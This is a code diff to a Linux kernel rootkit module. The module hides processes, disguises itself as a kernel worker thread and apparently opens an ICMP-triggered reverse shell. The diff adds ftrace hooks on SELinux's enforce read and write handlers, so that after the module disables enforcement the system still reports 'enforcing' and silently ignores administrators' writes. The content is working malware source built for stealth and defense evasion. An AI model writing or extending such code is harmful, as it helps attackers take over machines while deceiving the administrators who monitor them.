@@ -1,3 +1,9 @@
+/*
+
+    SELinux Bypass in Initial Version
+
+*/
+
 #include "../include/core.h"
 #include "../include/icmp.h"
 #include "../include/hidden_pids.h"
@@ -8,17 +14,68 @@
 #define PROC_NAME "[kworker/0:1]"
 
 static asmlinkage int (*orig_icmp_rcv)(struct sk_buff *);
+static asmlinkage ssize_t (*orig_sel_read_enforce)(struct file *, char __user *, size_t, loff_t *);
+static asmlinkage ssize_t (*orig_sel_write_enforce)(struct file *, const char __user *, size_t, loff_t *);
 
 struct revshell_work {
     struct work_struct work;
 };
 
 static void *selinux_state_ptr = NULL;
+static bool enforce_hook_active = false;
+static int fake_enforce_value = 1;
+
+notrace static asmlinkage ssize_t hook_sel_write_enforce(
+    struct file *filp,
+    const char __user *buf,
+    size_t count,
+    loff_t *ppos)
+{
+    char kbuf[32];
+    long val;
+    int ret;
+    
+    if (!enforce_hook_active)
+        return orig_sel_write_enforce(filp, buf, count, ppos);
+    
+    if (count > 0 && count < sizeof(kbuf)) {
+        if (copy_from_user(kbuf, buf, count))
+            return -EFAULT;
+        
+        kbuf[count] = '\0';
+        
+        ret = kstrtol(kbuf, 10, &val);
+        if (ret == 0) {
+            fake_enforce_value = (int)val;
+        }
+    }
+    
+    *ppos += count;
+    return count;
+}
+
+notrace static asmlinkage ssize_t hook_sel_read_enforce(
+    struct file *filp,
+    char __user *buf, 
+    size_t count,
+    loff_t *ppos)
+{
+    char tmpbuf[12];
+    ssize_t length;
+    
+    if (enforce_hook_active) {
+        length = scnprintf(tmpbuf, sizeof(tmpbuf), "%d",
+                          fake_enforce_value);
+        
+        return simple_read_from_buffer(buf, count, ppos, tmpbuf, length);
+    }
+    
+    return orig_sel_read_enforce(filp, buf, count, ppos);
+}
 
 notrace static int bypass_selinux_disable(void)
 {
     struct {
-        bool disabled;
         bool enforcing;
         bool checkreqprot;
         bool initialized;
@@ -31,6 +88,10 @@ notrace static int bypass_selinux_disable(void)
     
     #ifdef CONFIG_SECURITY_SELINUX_DEVELOP
     state->enforcing = 0;
+    
+    enforce_hook_active = true;
+    
+    fake_enforce_value = 1;
     #endif
     
     return 0;
@@ -127,6 +188,8 @@ out:
 
 static struct ftrace_hook hooks[] = {
     HOOK("icmp_rcv", hook_icmp_rcv, &orig_icmp_rcv),
+    HOOK("sel_read_enforce", hook_sel_read_enforce, &orig_sel_read_enforce),
+    HOOK("sel_write_enforce", hook_sel_write_enforce, &orig_sel_write_enforce),
 };
 
 notrace int hiding_icmp_init(void)
@@ -143,5 +206,7 @@ notrace int hiding_icmp_init(void)
 notrace void hiding_icmp_exit(void)
 {
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+    enforce_hook_active = false;
+    fake_enforce_value = 1;
     msleep(2000);
 }
